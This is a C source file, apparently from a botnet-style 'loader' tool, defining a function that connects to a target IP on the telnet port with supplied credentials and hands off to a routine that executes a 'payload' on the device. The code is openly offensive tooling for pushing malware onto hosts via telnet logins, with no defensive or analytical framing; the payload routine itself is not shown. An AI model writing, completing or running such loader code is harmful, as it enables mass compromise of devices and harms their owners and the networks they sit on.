#include "../../includes/telnet/connect.h"


/*
    *    util/loader/util/telnet/connect.c
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


void telnet_load(char *ipaddr, char *username, char *password, char *payload) {
    printf("\e[0;32mTarget: %s", ipaddr);
    
    strcat(username, "\n");
    strcat(password, "\n");
    
    int fd;
    struct sockaddr_in server;
    
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ipaddr);
    server.sin_port = htons(23);

    fd = socket(AF_INET, SOCK_STREAM, 0);
    
    connect(fd, (struct sockaddr *)&server, sizeof(server));
    telnet_exec_payload(fd, ipaddr, username, password, payload);
}